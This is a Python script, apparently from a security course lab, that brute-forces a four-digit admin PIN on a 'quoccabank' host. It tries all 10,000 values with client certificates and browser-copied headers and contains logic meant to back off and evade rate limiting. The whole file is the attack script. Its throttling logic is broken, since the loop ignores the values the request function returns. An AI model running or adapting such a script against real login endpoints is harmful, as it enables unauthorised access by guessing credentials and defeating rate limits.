import requests
import sys
import time
import re



pins = []

for i in range(0, 10000):
    if i < 10:
        pins.append('000'+str(i))
    elif i < 100 and i >= 10:
        pins.append('00'+str(i))
    elif i < 1000 and i >= 100:
        pins.append('0'+str(i))
    else:
        pins.append(i)



def request(data, sleep, count_200):
    cert = ('/home/fafnir/cert/6843.pem', '/home/fafnir/cert/6843.key')
    burp0_url = "https://files.quoccabank.com:443/admin"
    burp0_cookies = {"session": ""}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36", "Origin": "https://files.quoccabank.com", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://files.quoccabank.com/admin", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
    burp0_data = {"pin": data}
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, cert=cert)
    print(f'content len = {len(response.content)} pin = {data}' ) 


    #logic for rate limiting
    if(response.status_code == 200):
        if(count_200 > 30):
            print('resetting throttle')
            #returning sleep = 0
            #returning count = 0
            return (0, 0)
        return (sleep, count_200+1)

    
    #enhance ur clam
    if(response.status_code == 420):
        time.sleep(sleep+0.5)
        print(f'throttling for {sleep+0.5}s')
        return (sleep+0.25, 0)
    
    #default rate limit
    time.sleep(0.25)

    return(sleep,count_200)


sleep = 0
count_200 = 0

for pin in pins:
    request(pin, sleep, count_200)
        
    


